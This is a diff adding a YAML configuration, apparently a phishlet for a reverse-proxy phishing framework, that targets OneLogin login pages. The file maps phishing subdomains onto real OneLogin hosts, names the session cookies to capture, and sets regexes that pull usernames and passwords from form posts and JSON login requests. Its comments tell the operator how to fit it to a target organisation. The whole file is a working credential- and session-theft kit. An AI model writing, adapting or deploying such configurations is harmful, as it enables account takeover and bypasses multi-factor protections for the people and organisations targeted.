@@ -1,0 +1,37 @@
+name: 'onelogin'
+author: '@perfectlylogical'
+min_ver: '2.3.0'
+# NOTE: Do not forget to change EXMAPLE to the relevant sub domain.
+proxy_hosts:
+  - {phish_sub: '', orig_sub: '', domain: 'onelogin.com', session: false, is_landing: false }
+  - {phish_sub: 'EXAMPLE', orig_sub: 'EXAMPLE', domain: 'onelogin.com', session: true, is_landing: true}
+  - {phish_sub: 'portal-cdn', orig_sub: 'portal-cdn', domain: 'onelogin.com', session: false, is_landing: false}
+  # Uncomment this line if the target is using the default CSS for onelogin. Will manifest as the login page not loading.
+  #- {phish_sub: 'web-login-cdn', orig_sub: 'web-login-cdn', domain: 'onelogin.com', session: false, is_landing: false}
+sub_filters: []
+auth_tokens:
+  - domain: '.onelogin.com'
+    keys: ['onelogin.com_user']
+  - domain: 'EXAMPLE.onelogin.com'
+    keys: ['sub_session_onelogin.com']
+credentials:
+  username:
+    key: 'email'
+    search: '(.*)'
+    type: 'post'
+  password:
+    key: 'password'
+    search: '(.*)'
+    type: 'post'
+  # You will need to uncomment the custom section if the target is using /login2/.
+  # When using /login2/ it changes how it sends the JSON to the server.
+  #custom:
+  #  - key: 'username'
+  #    search: '"login":"(.*)"'
+  #    type: 'json'
+  #  - key: 'password'
+  #    search: '"password":"(.*)",'
+  #    type: 'json'
+login:
+  domain: 'EXAMPLE.onelogin.com'
+  path: '/login'
